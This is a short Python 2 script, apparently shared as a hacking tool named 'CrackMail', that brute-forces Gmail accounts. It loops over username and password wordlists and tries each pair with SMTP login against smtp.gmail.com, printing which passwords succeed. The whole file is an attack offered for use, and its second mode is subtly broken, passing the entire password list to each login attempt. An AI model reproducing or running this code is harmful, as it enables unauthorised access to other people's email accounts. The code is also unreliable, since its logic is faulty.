#!/usr/bin/python
print('''
	==================================
	|    CrackMail [Free Version]    |
	|     Brute Force [Gmail]        |
	|--------------------------------|
	| CoDeD By TA Hacker (@391F)     |
	|--------------------------------|

	''')
import smtplib
from os import system

smtp_host = 'smtp.gmail.com'
smtp_port = 465
smtpserver = smtplib.SMTP_SSL()
smtpserver.connect(smtp_host, smtp_port)
# smtpserver.ehlo()
# smtpserver.starttls()
smtpserver.ehlo

do = raw_input('''
		Choose any number ?
		1 - Email file
		2 - target email
		
		==>''')

if do == '1':
    user = raw_input("List Of Usernames => ")
    passfile = raw_input("List Of Passwords => ")
    loop_user = open(user, 'r').read().splitlines()
    loop_passfile = open(passfile, 'r').read().splitlines()
    for user in loop_user:
        for passfile in loop_passfile:
            try:
                smtpserver.login(user, passfile)

                print("[+] password found :%s" % passfile)

            except smtplib.SMTPAuthenticationError:
                print("[!] password incorrect :%s" % passfile)

############
if do == '2':
    user = raw_input("Enter the target email : ")
    passfile = raw_input('Enter the password file name : ')
    passfile = open(passfile, 'r').read().splitlines()

    for password in passfile:
        try:
            smtpserver.login(user, passfile)

            print("[+] password found :")

        except smtplib.SMTPAuthenticationError:
            print("[!] password incorrect :")

